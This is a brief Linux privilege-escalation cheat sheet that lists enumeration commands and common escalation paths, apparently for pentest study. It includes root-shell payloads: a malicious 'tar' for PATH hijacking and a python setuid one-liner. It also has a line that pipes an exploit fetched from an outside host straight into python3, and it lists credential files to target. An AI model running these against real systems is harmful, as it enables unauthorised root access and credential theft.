https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics
linpeas.sh

1) Sudo Misconfigurations
```
sudo -l
```
Binaries that can spawn shells*

2) SUID/SGID Binaries
- looking for binaries owned by root with SUID bit set 
```
find / -perm -u=s -type f 2>/dev/null
```
- Shells: bash, sh, zsh, python, perl, ruby, lua, dash
- File View/edit: vi/vim, nano, less/more, view, ed
- File Utilities: cp, mv, install, chmod, chown, touch 
- Networking: curl, wget, ftp, nc, socat
- Authentication: su, psexec

3) Writable Files & Directories
```
find / -writable -type d 2>/dev/null
```
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
- /etc/passwd
- /etc/shadow
- /etc/group (look for users in privileged groups)
- ~/.ssh/authorized_keys
- /etc/sudoers or /etc/sudoers.d/*
- config.php
- .env
- database.yml
- wp-config.php
- /root/.bash_history or ~/.zsh_history or ~/.bash_history
- /etc/init.d/
- /etc/systemd/system/*.service and /lib/systemd/system/*.service 
- /var/log/auth.log , /var/log/apache2/ , /var/log/httpd/ , /var/log/nginx/

4) Cron Jobs 
```
grep "CRON" /var/log/syslog
```
```
/etc/cron.d/*
crontab -l
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2> /dev/null /grep
```

5) Credential Reuse 
- Config files
- History files
- Backup files
- Database credentials 

6) PATH Hijacking 
Scripts that are run by root without full paths  
Example:
tar -czf /backup/home.tar.gz /home/* ( tar is called without full path - /bin/tar)
- We can create a malicious tar
```
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
```


7) Groups
```
id
```
- Groups that lead to privesc
- Practically Root
sudo / wheel
docker
lxd/lxc
disk
- Very Strong, Usually Wins
shadow
adm
systemd-journal

8) Capabilities
```
getcap -r / 2>/dev/null
```
- cap_setuid
- cap_sys_admin
- cap_dac_read_search
- cap_setgid
- cap_chown
- python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

9) Kernel Exploits
```
uname -a
```
linux-exploit-suggester.sh

curl https://copy.fail/exp | python3 && su
